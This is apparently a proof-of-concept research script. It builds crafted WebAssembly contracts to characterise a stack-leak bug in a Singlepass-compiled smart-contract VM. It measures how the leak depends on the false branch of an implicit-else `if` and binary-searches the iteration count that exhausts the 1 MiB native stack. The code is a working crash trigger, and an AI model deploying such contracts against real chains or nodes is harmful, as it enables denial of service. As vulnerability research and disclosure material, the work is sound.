#!/usr/bin/env python3
"""
Two refinements of the trigger characterisation:

  1. DATA DEPENDENCE.  The leak only happens on the path that falls through
     the *implicit* else, i.e. when the `if` condition is FALSE at run time.
     A contract whose condition is always true never leaks; one whose
     condition is false often enough does.

  2. EXACT THRESHOLD.  How many iterations of the leaking shape are needed
     to exhaust the 1 MiB Singlepass stack, and does the threshold scale
     with the number of `if`s executed per iteration?

Everything is measured against the production .so.
"""
import os
import sys
import tempfile

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)

import run_poc as R                                      # noqa: E402
from wasm_builder import (                               # noqa: E402
    Module, I32, I64, op_i32_const, op_i64_const, op_nop, op_end, op_if, op_else,
    op_drop, op_call, op_local_get, op_local_set, op_local_tee, op_i32_sub,
    op_loop, op_br_if, op_global_get, op_global_set,
)

RESP = b'{"ok":{"messages":[],"attributes":[],"events":[],"data":null}}'
STACK_BYTES = 1 << 20


def build(iterations, prefix, condition, ifs_per_iter=1, explicit=False):
    """prefix values are pushed before the `if`; the `if` has one i64 block
    parameter so that it spills to the native stack."""
    m = Module()
    m.add_memory(2, export="memory")
    t_pass = m.add_type([I64], [I64])
    m.add_data(16, (64).to_bytes(4, "little") + len(RESP).to_bytes(4, "little")
               + len(RESP).to_bytes(4, "little"))
    m.add_data(64, RESP)
    m.add_data(1024, (2048).to_bytes(4, "little") + (4096).to_bytes(4, "little")
               + (0).to_bytes(4, "little"))
    probe = m.add_func([], [], body=op_nop())

    b = bytearray()
    b += op_i32_const(iterations) + op_local_set(1)
    b += op_loop()
    for _ in range(ifs_per_iter):
        for _ in range(prefix):
            b += op_local_get(0)
        b += op_local_get(0)
        b += op_i32_const(condition)
        b += op_if(t_pass)
        if explicit:
            b += op_else()
        b += op_end()
        for _ in range(prefix + 1):
            b += op_drop()
    b += op_call(probe)
    b += op_local_get(1) + op_i32_const(1) + op_i32_sub() + op_local_tee(1) + op_br_if(0)
    b += op_end()
    fn = m.add_func([], [], locals=[I64, I32], body=bytes(b))
    m.add_func([I32, I32, I32], [I32], body=op_call(fn) + op_i32_const(16),
               export="execute")
    m.add_func([I32, I32, I32], [I32], body=op_i32_const(16), export="instantiate")
    m.add_func([I32], [I32], body=op_i32_const(1024), export="allocate")
    m.add_func([I32], [], body=op_nop(), export="deallocate")
    m.add_func([], [], body=op_nop(), export="interface_version_8")
    return m.build()


def run(iterations, prefix, condition, ifs_per_iter=1, explicit=False):
    wasm = build(iterations, prefix, condition, ifs_per_iter, explicit)
    base = tempfile.mkdtemp()
    vm = R.VM()
    cache = vm.init_cache(base)
    checksum = vm.store_code(cache, wasm, checked=True)
    res, rep, err = vm.instantiate(cache, checksum, 1 << 62)
    res2, rep2, err2 = vm.execute(cache, checksum, 1 << 62)
    e = vm._vec_str(err2)
    if "call stack exhausted" in e:
        return "STACK-EXH", rep2.used_internally
    if e:
        return "ERR", rep2.used_internally
    return "ok", rep2.used_internally


def threshold(prefix, condition, ifs_per_iter=1, explicit=False):
    """Smallest iteration count that exhausts the stack (binary search)."""
    lo, hi = 1, 1 << 20
    if run(hi, prefix, condition, ifs_per_iter, explicit)[0] != "STACK-EXH":
        return None
    while lo < hi:
        mid = (lo + hi) // 2
        if run(mid, prefix, condition, ifs_per_iter, explicit)[0] == "STACK-EXH":
            hi = mid
        else:
            lo = mid + 1
    return lo


def main():
    print("1) DATA DEPENDENCE: does the leak depend on the branch taken?")
    print("   (prefix=4, 200000 iterations, one `if` per iteration)")
    print()
    print("   %-14s %-16s %-16s" % ("condition", "implicit", "explicit-else"))
    print("   " + "-" * 48)
    for cond, label in ((0, "false (0)"), (1, "true (1)")):
        iv, _ = run(200000, 4, cond, 1, False)
        ev, _ = run(200000, 4, cond, 1, True)
        print("   %-14s %-16s %-16s" % (label, iv, ev))
        sys.stdout.flush()

    print()
    print("2) EXACT THRESHOLD (prefix=4, condition=0, implicit else)")
    print()
    print("   %-14s %-14s %-16s %s" % ("if/iter", "threshold", "bytes/iter", "note"))
    print("   " + "-" * 62)
    for ifs in (1, 2, 4, 8):
        t = threshold(4, 0, ifs)
        if t is None:
            print("   %-14d %-14s %-16s %s" % (ifs, "-", "-", "never exhausts"))
            continue
        print("   %-14d %-14d %-16.1f %s"
              % (ifs, t, STACK_BYTES / float(t),
                 "stack exhausted at %d iterations" % t))
        sys.stdout.flush()

    print()
    print("3) LEAKED BYTES PER if-EXECUTION")
    print("   (threshold x stack size / ifs per iteration)")
    t = threshold(4, 0, 1)
    if t:
        print("      %d bytes of native stack per `if` execution" % (STACK_BYTES // t))
    print()
    print("4) The explicit-else control must never exhaust the stack:")
    t2 = threshold(4, 0, 1, explicit=True)
    print("      threshold = %s" % ("none (never exhausts)" if t2 is None else t2))


if __name__ == "__main__":
    main()
